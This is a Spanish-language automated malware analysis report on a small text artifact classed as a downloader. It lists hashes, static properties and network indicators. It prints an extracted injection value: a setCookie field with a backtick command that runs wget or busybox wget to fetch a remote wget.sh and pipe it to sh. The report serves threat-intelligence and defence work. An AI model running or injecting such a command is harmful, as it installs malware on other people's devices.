# 🧬 Payload Analysis

`d9e11a90b90049ff4b9536e0ae056553ce94c1c21ed86fe84d69cd7e69ec2c5a`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 321 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d9e11a90b90049ff4b9536e0ae056553ce94c1c21ed86fe84d69cd7e69ec2c5a`
- **MD5:** `604ded4b9173a27c401e4b71b2c137b7`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 321 B |
| Entropía | 5.16 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
setCookie=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s zyxsc;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s z
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.175.XXX | static_analysis |
| command | setCookie=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s zyxsc;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s z | strings |
| hash | d9e11a90b90049ff4b9536e0ae056553ce94c1c21ed86fe84d69cd7e69ec2c5a | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
